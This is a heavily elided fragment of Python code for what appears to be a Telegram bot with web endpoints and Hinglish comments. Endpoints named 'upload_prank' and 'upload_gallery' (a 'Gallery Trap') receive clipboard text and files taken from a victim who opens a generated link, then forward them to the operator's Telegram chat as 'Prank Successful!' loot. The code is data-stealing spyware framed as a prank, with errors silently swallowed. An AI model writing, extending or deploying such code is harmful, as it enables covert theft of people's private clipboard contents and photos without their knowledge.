...
try:
    ...
    print("⚠️ Warning: OWNER_ID sahi nahi hai ya set nahi hai.")
    OWNER_ID = 0
...
# Gallery Trap (Yeh missing tha, ab add kar diya hai)
...
def upload_prank():
    try:
        ...
        if link_id in link_data:
            bot.send_message(link_data[link_id]['chat_id'], f"👻 **Prank Successful!**\n\n📋 **Clipboard Data:**\n`{copied_text}`", parse_mode="Markdown")
    except: pass
    return jsonify({"status": "ok"})
...
def upload_gallery():
    try:
        ...
        if link_id in link_data and file:
            bot.send_document(link_data[link_id]['chat_id'], file, caption=f"📁 **Gallery File:** {file.filename}")
    except: pass
    return jsonify({"status": "ok"})
